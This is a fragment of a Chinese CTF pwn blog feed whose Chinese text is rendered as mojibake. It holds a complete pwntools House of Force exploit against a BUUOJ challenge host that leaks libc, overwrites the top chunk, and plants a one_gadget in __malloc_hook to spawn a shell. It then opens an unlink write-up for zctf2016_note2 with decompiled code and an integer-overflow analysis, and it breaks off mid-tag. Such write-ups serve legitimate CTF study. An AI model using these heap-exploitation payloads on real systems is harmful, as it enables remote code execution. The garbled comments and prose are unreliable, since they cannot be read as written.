class="string">&quot;content\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    <span class="keyword">return</span> heapaddr</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹sizeæ— é™åˆ¶ï¼Œmallocå¤§chunkä½¿å¾—mmapåˆ†é…chunk</span></span><br><span class="line"><span class="comment"># è¯¥chunkå’Œlibcæœ‰å›ºå®šçš„åç§»</span></span><br><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;bbbb&#x27;</span>) + <span class="number">0x3ffff0</span></span><br><span class="line">success(<span class="string">&quot;libc_base address : &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰å †æº¢å‡ºï¼Œå¯æ‰“House of Force</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heapaddr = add(<span class="number">0x10</span>,payload) <span class="comment"># size = 0x21,topchunkåœ¨è¯¥chunkçš„+0x10å¤„</span></span><br><span class="line">success(<span class="string">&quot;chunk0 address : &quot;</span>+<span class="built_in">hex</span>(heapaddr))</span><br><span class="line">top = heapaddr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] </span><br><span class="line">onegadget = libc_base + <span class="number">0x4527a</span> <span class="comment"># æœ¬åœ°çš„onegadget </span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;onegadget : &quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(onegadget) + p64(realloc+<span class="number">0x4</span>))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="è¿œç¨‹å®Œæ•´EXP"><a href="#è¿œç¨‹å®Œæ•´EXP" class="headerlink" title="è¿œç¨‹å®Œæ•´EXP"></a>è¿œç¨‹å®Œæ•´EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28245</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;) # æœ¬åœ°</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;addr 0x&quot;</span>)</span><br><span class="line">    heapaddr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    <span class="keyword">return</span> heapaddr</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹sizeæ— é™åˆ¶ï¼Œmallocå¤§chunkä½¿å¾—mmapåˆ†é…chunk</span></span><br><span class="line"><span class="comment"># è¯¥chunkå’Œlibcæœ‰å›ºå®šçš„åç§»</span></span><br><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;bbbb&#x27;</span>) + <span class="number">0x200ff0</span> <span class="comment"># libcä¸åŒ,åç§»ä¸åŒ</span></span><br><span class="line">success(<span class="string">&quot;libc_base address : &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰å †æº¢å‡ºï¼Œå¯æ‰“House of Force</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heapaddr = add(<span class="number">0x10</span>,payload) <span class="comment"># size = 0x21,topchunkåœ¨è¯¥chunkçš„+0x10å¤„</span></span><br><span class="line">success(<span class="string">&quot;chunk0 address : &quot;</span>+<span class="built_in">hex</span>(heapaddr))</span><br><span class="line">top = heapaddr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] <span class="comment"># </span></span><br><span class="line"><span class="comment"># one= [0x45216,0x4526a,0xf02a4,0xf1147] </span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;onegadget : &quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(onegadget) + p64(realloc+<span class="number">0x4</span>)) <span class="comment"># +0x10ä¹Ÿæ˜¯å¯ä»¥çš„</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctfpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zctf2016_note2-unlink(unlinkç²¾è®²)</title>
      <link href="/2024/09/25/zctf2016-note2-unlink/"/>
      <url>/2024/09/25/zctf2016-note2-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="æ— æ³•å †æº¢å‡ºä¿®æ”¹chunkçš„unlink-æ•´æ•°æº¢å‡º"><a href="#æ— æ³•å †æº¢å‡ºä¿®æ”¹chunkçš„unlink-æ•´æ•°æº¢å‡º" class="headerlink" title="æ— æ³•å †æº¢å‡ºä¿®æ”¹chunkçš„unlink+æ•´æ•°æº¢å‡º"></a>æ— æ³•å †æº¢å‡ºä¿®æ”¹chunkçš„unlink+æ•´æ•°æº¢å‡º</h1><p><a class="link" href="https://buuoj.cn/challenges#zctf2016_note2">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>æœ‰ç¬¦å·æ•´å‹ä¸æ— ç¬¦å·æ•´å‹æ¯”è¾ƒ -&gt; å­˜åœ¨æº¢å‡º</p><h1 id="unlinkå®Œæ•´è¡¨ç¤º"><a href="#unlinkå®Œæ•´è¡¨ç¤º" class="headerlink" title="unlinkå®Œæ•´è¡¨ç¤º"></a>unlinkå®Œæ•´è¡¨ç¤º</h1><ul><li><strong>ä»¥å¾€çš„unlinkéƒ½æ˜¯å¯ä»¥å †æº¢å‡ºä¿®æ”¹ç›¸é‚»chunkçš„prev_sizeä»¥åŠå…¶size_inuse</strong>ï¼Œç„¶åæ„é€ å‡ºä¸€ä¸ªfake_free_chunkï¼Œç„¶åfreeç›¸é‚»çš„chunkï¼Œè¿™ä¸¤ä¸ªchunkå°±ä¼šåˆå¹¶ï¼Œä»è€Œè¾¾åˆ°unlinkçš„æ•ˆæœï¼Œå¦‚ä¸‹å›¾ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../unlink.drawio.png"></p><ul><li>æ¥ç€ä¸Šå›¾è®²ï¼šchunk1æ˜¯æ„é€ æˆäº†ä¸€ä¸ªfake_chunkï¼Œæ¥ç€free(chunk2),é‚£ä¹ˆè¿™ä¸¤ä¸ªchunkå°†ä¼šåˆå¹¶ï¼Œä»è€Œç»•è¿‡æ£€æµ‹ï¼Œè¾¾åˆ°unlinkçš„æ•ˆæœã€‚</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¯¹äºunsorted bin åŒå‘é“¾è¡¨çš„æ£€æµ‹</span></span><br><span class="line">chunk FDè¡¨ç¤ºchunkçš„ä¸‹ä¸€ä¸ªchunk BKè¡¨ç¤ºchunkçš„ä¸Šä¸€ä¸ªchunk</span><br><span class="line">chunk.fd -&gt; FD  FD.bk -&gt; chunk      chunk.bk -&gt; BK   BK.fd -&gt; chunk</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../unlink2.jpg"></p><ul><li>å¦‚ä¸Šå›¾ï¼Œç›¸å½“äºæŠŠheap[0]è¿ç§»åˆ°äº† -0x18çš„ä½ç½®ï¼Œè¿™å°±æ˜¯å®Œæ•´çš„unlinkåˆ©ç”¨æ–¹æ³•ã€‚</li></ul><h1 id="idaç¨‹åºæ‰§è¡Œæµåˆ†æ"><a href="#idaç¨‹åºæ‰§è¡Œæµåˆ†æ" class="headerlink" title="idaç¨‹åºæ‰§è¡Œæµåˆ†æ"></a>idaç¨‹åºæ‰§è¡Œæµåˆ†æ</h1><h2 id="mainå‡½æ•°"><a href="#mainå‡½æ•°" class="headerlink" title="mainå‡½æ•°"></a>mainå‡½æ•°</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">0x3Cu</span>);</span><br><span class="line">  <span class="comment">// ä¸‹é¢è¿™ä¸¤æ­¥éšä¾¿è¾“å…¥ï¼Œå¯¹äºUnlinkæ²¡æœ‰å½±å“</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  <span class="built_in">input1</span>(&amp;unk_<span class="number">6020E0</span>, <span class="number">64LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your address:&quot;</span>);</span><br><span class="line">  <span class="built_in">input1</span>(&amp;unk_602180, <span class="number">96LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( <span class="built_in">menu</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">add</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">show</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">edit</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><ul><li>å¯¹äºsizeæœ‰è¦æ±‚</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> add()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> v1; // eax</span><br><span class="line">  unsigned <span class="built_in">int</span> size; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  void *chunk_data_addr; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( heapidx &gt; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;note lists are full&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;Input the length of the note content:(less than 128)&quot;</span>);</span><br><span class="line">  size = <span class="built_in">input</span>();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x80</span> )                            // size &lt;= <span class="number">0x80</span></span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Too long&quot;</span>);</span><br><span class="line">  chunk_data_addr = malloc(size);</span><br><span class="line">  puts(<span class="string">&quot;Input the note content:&quot;</span>);</span><br><span class="line">  input1(chunk_data_addr, size, <span class="number">10</span>);</span><br><span class="line">  sub_400B10(chunk_data_addr);</span><br><span class="line">  *(&amp;heaplist + heapidx) = chunk_data_addr;</span><br><span class="line">  chunk_size[heapidx] = size;</span><br><span class="line">  v1 = heapidx++;</span><br><span class="line">  <span class="keyword">return</span> printf(<span class="string">&quot;note add success, the id is %d\n&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><ul><li>%sè¾“å‡ºï¼Œå¯ä»¥æ³„éœ²libc</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  <span class="built_in">LODWORD</span>(v0) = <span class="built_in">input</span>();</span><br><span class="line">  idx = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(&amp;heaplist + v0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">      <span class="built_in">LODWORD</span>(v0) = <span class="built_in">printf</span>(<span class="string">&quot;Content is %s\n&quot;</span>, *(&amp;heaplist + idx));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><ul><li>æœ€å¤æ‚çš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„åœ°æ–¹ï¼Œå…¶å®åªéœ€è¦å…³æ³¨è¾“å…¥1çš„overwrite</li><li>è¿™é‡Œæ˜¯å…ˆmallocäº†ä¸€ä¸ª(0xa0)çš„chunkï¼Œç„¶åå‘è¯¥chunkå¡«å…¥æ•°æ®ï¼Œè¿›è¡Œoverwriteï¼Œæœ€åfreeæ‰è¿™ä¸ª</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-E4h]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">128</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// [rsp+A0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+D8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heapidx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">    v2 = <span class="built_in">input</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src = *(&amp;heaplist + v2);</span><br><span class="line">      v5 = chunk_size[v2];</span><br><span class="line">      <span class="keyword">if</span> ( src )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;</span>);</span><br><span class="line">        v3 = <span class="built_in">input</span>();</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> || v3 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">            dest[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">          v7 = <span class="built_in">malloc</span>(<span class="number">0xA0uLL</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(v7, <span class="string">&quot;TheNewContents:&quot;</span>);</span><br><span class="line">          <span class="built_in">printf</span>(v7);</span><br><span class="line">          <span class="built_in">input1</span>(v7 + <span class="number">15</span>, <span class="string">&#x27;\x90&#x27;</span>, <span class="number">10</span>);</span><br><span class="line">          <span class="built_in">sub_400B10</span>(v7 + <span class="number">15</span>);</span><br><span class="line">          v0 = v7;</span><br><span class="line">          v0[v5 - <span class="built_in">strlen</span>(dest) + <span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strncat</span>(dest, v7 + <span class="number">15</span>, <span class="number">0xFFFFFFFFFFFFFFFFLL</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(src, dest);</span><br><span class="line">          <span class="built_in">free</span>(v7);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Edit note success!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Error choice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;note has been deleted&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please add a note!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><ul><li>å¯¹freeçš„æŒ‡é’ˆè¿›è¡Œäº†æ¸…é›¶çš„æ“ä½œï¼Œuafå’Œdouble freeæ— æ³•ä½¿ç”¨äº†</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  <span class="built_in">LODWORD</span>(v0) = <span class="built_in">input</span>();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(&amp;heaplist + v0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(&amp;heaplist + v2));</span><br><span class="line">      *(&amp;heaplist + v2) = <span class="number">0LL</span>;</span><br><span class="line">      chunk_size[v2] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">LODWORD</span>(v0) = <span class="built_in">puts</span>(<span class="string">&quot;delete note success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="æ ¸å¿ƒæ¼æ´ç‚¹-æ•´æ•°æº¢å‡º"><a href="#æ ¸å¿ƒæ¼æ´ç‚¹-æ•´æ•°æº¢å‡º" class="headerlink" title="æ ¸å¿ƒæ¼æ´ç‚¹-æ•´æ•°æº¢å‡º"></a>æ ¸å¿ƒæ¼æ´ç‚¹-æ•´æ•°æº¢å‡º</h2><ul><li>åœ¨addå‡½æ•°çš„input1å‡½æ•°ä¸­ï¼Œå­˜åœ¨éš¾å‘ç°çš„æ•´æ•°æº¢å‡ºæ¼æ´</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240925195730160.bmp"></p><ul><li><font size="red">å®šä¹‰çš„iæ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´å‹ï¼Œä½†æ˜¯a2(size)ç¡®æ˜¯ä¸€ä¸ªæœ‰ç¬¦å·æ•´å½¢ï¼Œå› æ­¤æœ‰æ•´æ•°æº¢å‡º</font></li><li>å¯¹äºæ— ç¬¦å·ä¸æœ‰ç¬¦å·çš„æ¯”è¾ƒï¼Œä¼šå°†<strong>æœ‰ç¬¦å·è½¬åŒ–ä¸ºæ— ç¬¦å·</strong>ï¼Œæ‰€ä»¥è‹¥æˆ‘ä»¬ç»™a2èµ‹å€¼ä¸º0ï¼Œa2 -1&#x3D;-1,å¯¹åº”äºæ— ç¬¦å·æ•´å‹æ˜¯æœ€å¤§çš„æ•°å­—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä»»æ„å†™äº†ã€‚</li></ul><h1 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" 